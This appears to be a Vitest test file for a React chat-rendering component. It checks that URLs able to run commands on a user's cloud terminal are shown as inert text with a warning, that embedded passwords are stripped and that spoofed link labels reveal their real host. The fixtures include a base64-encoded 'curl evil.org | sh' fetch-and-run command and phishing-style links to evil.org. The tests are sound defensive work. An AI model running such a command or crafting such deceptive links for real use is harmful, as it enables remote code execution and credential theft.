// Vitest: hard blocks 1, 2, 3, 10, 11 and the lying-label host, through the real Prose. Every consumer draws
// links here, so one table covers them all.
import { render } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { familyDomains, maskAddress, setProxyDomain } from '../../core/hosts';
import { Prose } from './Reply';

// Builds a fake credential from parts, so no source line holds a whole key-shaped string.
const fake = (...p: string[]) => p.join('');

const PROXY = 'computers.hoody.test';
// Readable ids, so an allowed address is a plain <a> with its href: the Link draws an address holding a 24-hex id as its
// secret button instead (kit/controls/Link.tsx), and the last describe covers that case.
const on = (name: string, n: number | string = 1, p = 'proj1', c = 'comp1') => `${p}-${c}-${name}-${n}.sg1.${PROXY}`;
const HEX_P = 'a'.repeat(24);
const HEX_C = 'b'.repeat(24);
const TWIN = familyDomains(PROXY).find((d) => d !== PROXY) as string;
const NOTE = 'Not linked: opening this address could run something.';
const CMD = btoa('curl evil.org | sh');

let unmount: (() => void) | null = null;
const draw = (text: string) => {
  const r = render(<Prose text={text} />);
  unmount = r.unmount;
  // The whole page: each test unmounts its render, so the body holds only this one.
  return r.baseElement;
};
const hrefs = (c: Element) => [...c.querySelectorAll('a')].map((a) => a.getAttribute('href'));

beforeEach(() => setProxyDomain(PROXY));
afterEach(() => {
  unmount?.();
  unmount = null;
  setProxyDomain(null);
});

describe('an address that could act is text with a note, in every form Prose reads', () => {
  const table: [string, string][] = [
    ['terminal cmd', `https://${on('terminal')}/?cmd=${CMD}`],
    ['t alias cmd', `https://${on('t')}/?cmd=${CMD}`],
    ['port 7681 cmd', `https://${on('http', 7681)}/?cmd=${CMD}`],
    ['https port 7681 cmd', `https://${on('https', 7681)}/?cmd=${CMD}`],
    ['alias cmd', `https://my-terminal.sg1.${PROXY}/?cmd=${CMD}`],
    ['twin family cmd', `https://my-terminal.sg1.${TWIN}/?cmd=${CMD}`],
    ['localhost cmd', `http://localhost:7681/?cmd=${CMD}`],
    ['terminal panel', `https://${on('terminal')}/?panel=https://evil.org`],
    ['port panel', `https://${on('http', 7681)}/?panel=https://evil.org`],
    ['browser iframe_url', `https://${on('browser')}/?iframe_url=https://evil.org`],
    ['nested acting', `https://${on('http', 3000)}/?next=${encodeURIComponent(`https://${on('terminal')}/?cmd=${CMD}`)}`],
    ['browser start', `https://${on('browser')}/api/v1/browser/start`],
    ['program user', `https://${on('terminal')}/?user=root`],
    ['program reset', `https://${on('terminal')}/?reset=1`],
    ['port 7681 env', `https://${on('http', 7681)}/?env=A%3D1`],
    ['port 7681 redirect', `https://${on('https', 7681)}/?redirect=https://evil.org`],
  ];
  for (const [name, url] of table) {
    it(`${name}: labelled`, () => {
      const c = draw(`Try [the dashboard](${url}) now`);
      expect(c.querySelectorAll('a')).toHaveLength(0);
      expect(c.textContent).toContain('Try the dashboard');
      expect(c.textContent).toContain(NOTE);
    });
    it(`${name}: bare, shown whole`, () => {
      const c = draw(`Try ${url} now`);
      expect(c.querySelectorAll('a')).toHaveLength(0);
      expect(c.textContent).toContain(new URL(url).href);
      expect(c.textContent).toContain(NOTE);
    });
    it(`${name}: as an image, in a list, a table and bold`, () => {
      expect(draw(`![alt](${url})`).querySelectorAll('a')).toHaveLength(0);
      unmount?.();
      expect(draw(`- [x](${url})`).querySelectorAll('a')).toHaveLength(0);
      unmount?.();
      expect(draw(`| a |\n| --- |\n| [x](${url}) |`).querySelectorAll('a')).toHaveLength(0);
      unmount?.();
      expect(draw(`**[x](${url})**`).querySelectorAll('a')).toHaveLength(0);
    });
  }
  it('a label that is itself the address gets one note, not two', () => {
    const url = `https://${on('terminal')}/?cmd=${CMD}`;
    const c = draw(`[${url}](${url})`);
    expect(c.querySelectorAll('a')).toHaveLength(0);
    expect(c.textContent?.split(NOTE)).toHaveLength(2);
  });
  it('a hostile address inside the label of a good link is no link of its own', () => {
    const c = draw(`[https://${on('terminal')}/?cmd=${CMD}](https://example.org/)`);
    expect(hrefs(c)).toEqual(['https://example.org/']);
  });
});

describe('real links keep working, exact address and all', () => {
  const table: [string, string][] = [
    ['terminal cwd and readonly', `https://${on('terminal')}/?cwd=%2Fhome%2Fuser&readonly=true`],
    ['Board terminal_id', `https://${on('terminal')}/?terminal_id=abc123`],
    ['port deep link', `https://${on('http', 3000)}/orders/42?tab=open&page=2#row-9`],
    ['program page with looks', `https://${on('code')}/?folder=%2Fhome&theme=dark`],
    ['terminal panel size', `https://${on('terminal')}/?panel-height=30`],
    ['outside site with acting words', 'https://example.org/?cmd=x&redirect=y&user=z'],
    ['port with a word only a program acts on', `https://${on('http', 3000)}/?user=7&action=view`],
    ['own site, redirect and reset', `https://${on('http', 3000)}/login?redirect=/home&reset=1&env=prod`],
    ['unresolved alias, until S1 reads its target', `https://my-app.sg1.${PROXY}/?redirect=/home&reset=1&env=prod`],
  ];
  for (const [name, url] of table) {
    it(`${name}: labelled and bare`, () => {
      const c = draw(`[open](${url}) and ${url}`);
      expect(hrefs(c)).toEqual([url, url]);
      expect(c.textContent).not.toContain(NOTE);
    });
  }
  it('carries no note on an empty label', () => {
    const url = `https://${on('http', 3000)}/a`;
    const c = draw(`[](${url})`);
    expect(hrefs(c)).toEqual([url]);
    expect(c.textContent).toBe(url);
  });
});

describe('what stays a link but will get no frame or mark', () => {
  it('a nested address: same link today, exact address', () => {
    const url = `https://${on('http', 3000)}/?next=https://evil.org/`;
    const c = draw(`[x](${url})`);
    expect(hrefs(c)).toEqual([url]);
    expect(c.textContent).not.toContain(NOTE);
  });
  it('a program API path: same link today', () => {
    const url = `https://${on('files')}/api/v1/list`;
    expect(hrefs(draw(url))).toEqual([url]);
  });
});

describe('a Hub link is rebuilt to its fixed shape', () => {
  const hub = `${location.origin}/auth/home`;
  it('keeps the page and selection, drops the rest', () => {
    const c = draw(`[chat](${hub}?x=1#/ai/c/s1?computer=h1&realm=r1&do=delete&open_realm=z&share=1)`);
    expect(hrefs(c)).toEqual([`${hub}#/ai/c/s1?computer=h1&realm=r1`]);
  });
  it('bare, it shows what it opens', () => {
    const c = draw(`${hub}#/board?connect=ssh&b=x`);
    expect(hrefs(c)).toEqual([`${hub}#/board?b=x`]);
    expect(c.textContent).toBe(`${hub}#/board?b=x`);
    expect(c.textContent).not.toContain('connect');
  });
});

describe('embedded credentials', () => {
  it('a lookalike reads its real host', () => {
    const c = draw('https://hub.hoody.com@evil.org/x');
    expect(hrefs(c)).toEqual(['https://evil.org/x']);
    expect(c.textContent).toBe('https://evil.org/x');
    expect(c.textContent).not.toContain('hub.hoody.com');
  });
  it('a refused address that shows a secret once normalised drops them too', () => {
    const c = draw(fake('https://alice:', 'hunter2@sk%2Dabcdefghijklmnop1234.example/'));
    expect(c.querySelectorAll('a')).toHaveLength(0);
    expect(document.body.innerHTML).not.toContain('hunter2');
    expect(document.body.innerHTML).not.toContain('abcdefghijklmnop1234');
  });
  it('a password shows nowhere', () => {
    const url = fake('https://root:', 'hunter2@example.org/');
    const c = draw(`[db](${url}) and ${url} and [](${url})`);
    expect(hrefs(c)).toEqual(['https://example.org/', 'https://example.org/', 'https://example.org/']);
    expect(document.body.innerHTML).not.toContain('hunter2');
  });
  it('and when the address could act', () => {
    const c = draw(`https://root:hunter2@${on('terminal')}/?cmd=x`);
    expect(c.querySelectorAll('a')).toHaveLength(0);
    expect(c.textContent).toContain(`https://${on('terminal')}/?cmd=x`);
    expect(document.body.innerHTML).not.toContain('hunter2');
  });
});

describe('a label that names another host', () => {
  it('shows the real host after the link', () => {
    const c = draw('Log in at [hub.hoody.com](https://evil.org/x).');
    expect(hrefs(c)).toEqual(['https://evil.org/x']);
    expect(c.textContent).toBe('Log in at hub.hoody.com (evil.org).');
  });
  it('sees through markup in the label, and draws no link inside a link', () => {
    for (const label of ['**hub.hoody.com**', '`hub.hoody.com`', '*hub*.hoody.com']) {
      const c = draw(`[${label}](https://evil.org/x)`);
      expect(c.textContent, label).toBe('hub.hoody.com (evil.org)');
      unmount?.();
    }
    const c = draw('[https://hub.hoody.com/](https://evil.org/x)');
    expect(hrefs(c)).toEqual(['https://evil.org/x']);
    expect(c.textContent).toBe('https://hub.hoody.com/ (evil.org)');
  });
  it('adds nothing when the label is honest or names a file', () => {
    for (const [label, url] of [['example.com', 'https://example.com/'], ['example.com', 'https://www.example.com/'], ['the docs', 'https://evil.org/'], ['README.md', 'https://evil.org/']] as const) {
      const c = draw(`[${label}](${url})`);
      expect(c.textContent, label).toBe(label);
      unmount?.();
    }
  });
});

describe('real computer ids', () => {
  it('a blocked bare address shows them masked, as a link would', () => {
    const url = `https://${on('terminal', 1, HEX_P, HEX_C)}/?cmd=x`;
    const c = draw(url);
    expect(c.querySelectorAll('a, button')).toHaveLength(0);
    expect(c.textContent).toContain(maskAddress(url));
    expect(c.textContent).not.toContain(HEX_P);
  });
  it('an allowed one stays the Link\'s own secret button, with no note', () => {
    const url = `https://${on('terminal', 1, HEX_P, HEX_C)}/?cwd=%2Fhome&readonly=true`;
    const c = draw(`[open](${url})`);
    expect(c.querySelectorAll('button')).toHaveLength(1);
    expect(c.textContent).not.toContain(NOTE);
  });
});
